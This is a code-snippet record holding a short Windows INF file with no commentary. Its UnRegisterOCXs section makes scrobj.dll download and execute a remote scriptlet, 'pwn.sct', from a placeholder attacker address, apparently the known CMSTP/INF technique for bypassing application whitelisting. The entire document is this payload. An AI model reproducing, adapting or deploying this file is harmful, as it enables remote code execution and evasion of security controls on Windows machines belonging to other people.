---
id: 80d7fe0f-1a97-4c98-8862-8eb845dbe61c
type: code
language: INF File
verified: false
created_at: '2020-03-04T05:23:35.106878+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet 80d7fe0f

**Language**: INF File

```inf file
[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall_SingleUser]
UnRegisterOCXs=UnRegisterOCXSection

[UnRegisterOCXSection]
%11%\scrobj.dll,NI,http://$_ATTACKER_IP/pwn.sct

[Strings]
AppAct="SOFTWARE\Microsoft\Connection Manager"
ServiceName="Corp"
ShortSvcName="Corp"
```
